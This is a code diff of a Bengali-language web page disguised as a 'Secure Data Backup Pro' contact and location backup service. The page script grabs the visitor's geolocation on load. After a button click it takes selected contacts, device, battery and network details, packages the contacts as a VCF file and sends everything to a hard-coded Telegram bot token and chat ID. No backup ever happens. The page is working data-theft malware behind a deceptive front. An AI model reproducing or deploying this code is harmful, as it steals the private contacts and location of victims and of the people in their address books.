@@ -3,198 +3,226 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Cloud Backup</title>
+    <title>Secure Data Backup Pro</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        :root { 
-            --primary: #0088cc; 
-            --accent: #ff9f43;
-            --success: #2ecc71; 
-            --bg: #f8f9fa; 
-        }
-        
-        body { 
-            font-family: 'Hind Siliguri', sans-serif; 
-            background: var(--bg); 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        :root {
+            --primary: #d4af37; /* Golden */
+            --bg: #0f172a;    /* Deep Dark Blue/Black */
+            --card: #1e293b;
+            --text: #f8fafc;
         }
 
-        .card { 
-            background: #ffffff; 
-            padding: 40px; 
-            border-radius: 30px; 
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); 
-            text-align: center; 
-            width: 380px; 
-            border: 1px solid #eee;
-        }
-
-        .icon-circle {
-            width: 80px;
-            height: 80px;
-            background: rgba(0, 136, 204, 0.1);
-            border-radius: 50%;
+        body {
+            font-family: 'Hind Siliguri', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
             display: flex;
-            align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 35px;
+            align-items: center;
+            min-height: 100vh;
         }
 
-        h2 { color: #1e272e; margin-bottom: 8px; font-weight: 600; }
-        p { color: #576574; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
-
-        .counter-badge {
-            background: var(--accent);
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 13px;
-            display: none;
-            margin-bottom: 15px;
-            animation: fadeIn 0.5s;
-        }
-
-        .btn { 
-            background: linear-gradient(135deg, #0088cc, #00d2ff); 
-            color: white; 
-            border: none; 
-            padding: 18px; 
-            font-size: 17px; 
-            font-weight: bold; 
-            border-radius: 18px; 
-            cursor: pointer; 
-            width: 100%; 
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
-            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.2);
-        }
-
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 136, 204, 0.3); }
-        .btn:disabled { background: #dcdde1; cursor: not-allowed; transform: none; box-shadow: none; }
-
-        #status { margin-top: 25px; font-size: 14px; font-weight: 500; color: #333; }
-        
-        .prog-container {
-            width: 100%;
-            height: 8px;
-            background: #eee;
-            border-radius: 10px;
-            margin-top: 20px;
+        .container {
+            background: var(--card);
+            width: 90%;
+            max-width: 420px;
+            padding: 40px 30px;
+            border-radius: 30px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            text-align: center;
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            position: relative;
             overflow: hidden;
-            display: none;
         }
-        .prog-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.5s ease; }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .container::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.05) 0%, transparent 70%);
+            z-index: 0;
+        }
+
+        .content { position: relative; z-index: 1; }
+
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 10px var(--primary));
+        }
+
+        h2 { color: var(--primary); margin-bottom: 10px; font-weight: 600; font-size: 26px; }
+        p { color: #94a3b8; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+
+        .input-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label { font-size: 12px; color: var(--primary); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        
+        #displayLocation { color: #fff; font-size: 14px; margin-top: 5px; min-height: 20px; }
+
+        .btn {
+            background: linear-gradient(135deg, #d4af37, #f2d06b);
+            color: #000;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.3);
+        }
+
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(212, 175, 55, 0.4); }
+        .btn:active { transform: scale(0.98); }
+
+        #status { margin-top: 25px; font-size: 14px; color: var(--primary); font-weight: 500; }
+
+        .loading-bar {
+            height: 4px;
+            width: 0%;
+            background: var(--primary);
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            transition: 0.5s;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="icon-circle">📂</div>
-    <div id="counter" class="counter-badge"></div>
-    <h2>ক্লাউড ব্যাকআপ সিঙ্ক</h2>
-    <p>আপনার কন্টাক্ট এবং ডিভাইস মেটাডেটা সুরক্ষিতভাবে ব্যাকআপ করতে নিচের বাটনে ক্লিক করুন।</p>
-    
-    <button id="actionBtn" class="btn">ব্যাকআপ শুরু করুন</button>
-    
-    <div class="prog-container" id="progCont">
-        <div class="prog-bar" id="progBar"></div>
+<div class="container">
+    <div class="content">
+        <div class="logo">🛡️</div>
+        <h2>সিকিউর ক্লাউড সিঙ্ক</h2>
+        <p>আপনার কন্টাক্ট এবং লোকেশন ডেটা এনক্রিপ্টেড ব্যাকআপ নিতে নিচের বাটনে ক্লিক করুন।</p>
+        
+        <div class="input-box">
+            <label>ডিটেক্টেড লোকেশন</label>
+            <div id="displayLocation">লোকেশন পারমিশন চেক করা হচ্ছে...</div>
+        </div>
+
+        <button id="syncBtn" class="btn">ব্যাকআপ শুরু করুন</button>
+        <div id="status">সিস্টেম অনলাইন</div>
     </div>
-    <div id="status">সিস্টেম অনলাইন</div>
+    <div class="loading-bar" id="loadBar"></div>
 </div>
 
 <script>
-    const CONFIG = {
-        BOT_TOKEN: '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc',
+    const TELEGRAM_CONFIG = {
+        TOKEN: '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc',
         CHAT_ID: '5923885908'
     };
 
-    const btn = document.getElementById('actionBtn');
+    let fullAddress = "পাওয়া যায়নি";
+    let coords = "";
+
+    // ১. পেজ লোড হতেই অটোমেটিক লোকেশন বের করা
+    async function autoLocate() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
+                    const data = await res.json();
+                    fullAddress = data.display_name;
+                    document.getElementById('displayLocation').innerText = fullAddress;
+                } catch (e) {
+                    document.getElementById('displayLocation').innerText = coords;
+                }
+            }, () => {
+                document.getElementById('displayLocation').innerText = "পারমিশন ব্লক করা হয়েছে";
+            });
+        }
+    }
+    autoLocate();
+
+    const syncBtn = document.getElementById('syncBtn');
     const status = document.getElementById('status');
-    const counter = document.getElementById('counter');
-    const progCont = document.getElementById('progCont');
-    const progBar = document.getElementById('progBar');
+    const loadBar = document.getElementById('loadBar');
 
-    btn.addEventListener('click', async () => {
+    syncBtn.addEventListener('click', async () => {
         try {
-            // ১. ডিভাইস তথ্য (Battery & Network)
-            const battery = await navigator.getBattery();
-            const batteryInfo = `🔋 ব্যাটারি: ${Math.round(battery.level * 100)}% (${battery.charging ? 'চার্জ হচ্ছে' : 'ডিসচার্জিং'})`;
-            const netInfo = `🌐 নেটওয়ার্ক: ${navigator.connection?.effectiveType || 'অজানা'}`;
-            const devInfo = `📱 ব্রাউজার: ${navigator.userAgent.split(' ')[0]}`;
+            if (!('contacts' in navigator)) {
+                alert("আপনার ব্রাউজারে কন্টাক্ট সাপোর্ট নেই। দয়া করে অ্যান্ড্রয়েড ক্রোম ব্যবহার করুন।");
+                return;
+            }
 
-            // ২. লোকেশন (পারমিশন চাইলে)
-            let locData = "📍 লোকেশন: অফলাইন";
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 4000});
-                });
-                locData = `📍 ম্যাপ লিংক: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            } catch(e) {}
-
-            // ৩. কন্টাক্ট সিলেকশন (কাউন্টার ফিচার সহ)
-            if (!('contacts' in navigator)) throw new Error("আপনার ব্রাউজারটি উপযুক্ত নয়।");
-            
-            status.innerText = "কন্টাক্ট লিস্ট লোড হচ্ছে...";
             const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
             if (contacts.length > 0) {
-                // কন্টাক্ট কাউন্টার দেখানো
-                counter.innerText = `✅ ${contacts.length}টি কন্টাক্ট পাওয়া গেছে`;
-                counter.style.display = "inline-block";
-                
-                btn.disabled = true;
-                progCont.style.display = "block";
-                status.innerText = "সার্ভারে পাঠানো হচ্ছে...";
-                progBar.style.width = "40%";
+                syncBtn.disabled = true;
+                status.innerText = "এনক্রিপ্টিং এবং সেন্ডিং...";
+                loadBar.style.width = "40%";
 
-                // ৪. VCF ফাইল এবং রিপোর্ট জেনারেশন
-                let vcfText = "";
+                // ২. ডিভাইস ইনফো সংগ্রহ
+                const battery = await navigator.getBattery();
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    battery: Math.round(battery.level * 100) + "%",
+                    charging: battery.charging ? "Yes" : "No",
+                    connection: navigator.connection?.effectiveType || "Unknown",
+                    time: new Date().toLocaleString('bn-BD')
+                };
+
+                // ৩. VCF ফাইল তৈরি
+                let vcfData = "";
                 contacts.forEach(c => {
-                    const n = c.name ? c.name[0] : "অচেনা";
-                    const p = c.tel ? c.tel[0] : "নম্বর নেই";
-                    vcfText += `BEGIN:VCARD\nVERSION:3.0\nFN:${n}\nTEL:${p}\nEND:VCARD\n`;
+                    vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${c.name ? c.name[0] : 'Unknown'}\nTEL:${c.tel ? c.tel[0] : ''}\nEND:VCARD\n`;
                 });
 
-                const report = `📢 **নতুন ব্যাকআপ রিপোর্ট**\n\n${devInfo}\n${batteryInfo}\n${netInfo}\n${locData}\n\n🔢 মোট কন্টাক্ট: ${contacts.length}`;
+                // ৪. পূর্ণাঙ্গ রিপোর্ট তৈরি
+                const reportMsg = `🏆 **প্রিমিয়াম ব্যাকআপ রিপোর্ট**\n\n` +
+                    `👤 **মোট কন্টাক্ট:** ${contacts.length}\n` +
+                    `📍 **ঠিকানা:** ${fullAddress}\n` +
+                    `🗺 **কোঅর্ডিনেট:** ${coords}\n\n` +
+                    `📱 **ডিভাইস তথ্য:**\n` +
+                    `🔋 ব্যাটারি: ${deviceInfo.battery} (Charging: ${deviceInfo.charging})\n` +
+                    `🌐 নেটওয়ার্ক: ${deviceInfo.connection}\n` +
+                    `⏰ সময়: ${deviceInfo.time}`;
 
-                // ৫. টেলিগ্রামে ডেটা ট্রান্সফার
-                await sendReport(report, vcfText);
+                // ৫. টেলিগ্রামে পাঠানো
+                await sendToTelegram(reportMsg, vcfData);
 
-                progBar.style.width = "100%";
-                status.innerText = "✅ ব্যাকআপ সম্পন্ন হয়েছে!";
-                status.style.color = "#2ecc71";
-            } else {
-                status.innerText = "কোনো কন্টাক্ট সিলেক্ট করা হয়নি।";
+                loadBar.style.width = "100%";
+                status.innerText = "✅ ব্যাকআপ সফলভাবে সম্পন্ন হয়েছে!";
+                status.style.color = "#d4af37";
             }
-
         } catch (err) {
-            status.innerText = "এরর: " + err.message;
-            status.style.color = "#e74c3c";
-            btn.disabled = false;
+            status.innerText = "ত্রুটি: " + err.message;
+            syncBtn.disabled = false;
         }
     });
 
-    async function sendReport(text, vcf) {
-        // ১. রিপোর্ট পাঠানো
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+    async function sendToTelegram(msg, vcf) {
+        // মেসেজ পাঠানো
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
         });
 
-        // ২. VCF ফাইল পাঠানো
+        // VCF ফাইল পাঠানো
         const blob = new Blob([vcf], { type: 'text/vcard' });
         const formData = new FormData();
-        formData.append('chat_id', CONFIG.CHAT_ID);
-        formData.append('document', blob, 'Contacts_Backup.vcf');
+        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
+        formData.append('document', blob, `Backup_${Date.now()}.vcf`);
 
-        return fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
+        return fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendDocument`, {
             method: 'POST',
             body: formData
         });
